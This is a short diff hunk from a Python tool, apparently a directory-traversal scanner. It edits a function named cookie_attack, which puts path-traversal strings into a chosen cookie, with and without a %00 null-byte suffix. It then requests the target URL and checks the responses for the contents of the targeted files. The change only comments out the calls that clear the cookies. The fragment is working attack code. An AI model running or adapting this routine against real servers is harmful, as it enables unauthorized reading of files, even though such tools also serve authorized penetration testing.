@@ -104,17 +104,17 @@ def cookie_attack(url, cookie, selected, files, dirs, depth, verbose, dl, summar
                         j+=1
                     requestlist = []
                     val1 = traverse + dir + file
-                    s.cookies.clear()
+                    #s.cookies.clear()
                     s.cookies.set(selected, traverse + dir + file)
                     r = s.get(url)
                     requestlist.append((r, val1))
                     val2 = traverse + dir + file + "%00"
-                    s.cookies.clear()
+                    #s.cookies.clear()
                     s.cookies.set(selected, traverse + dir + file + "%00")
                     r = s.get(url)
                     requestlist.append((r, val2))
                     for (r, val) in requestlist:
-                        s.cookies.clear()
+                        #s.cookies.clear()
                         s.cookies.set(selected, val)
                         if str(r.status_code).startswith("2") or r.status_code == 302:
                             if filecheck(r.content, con2):
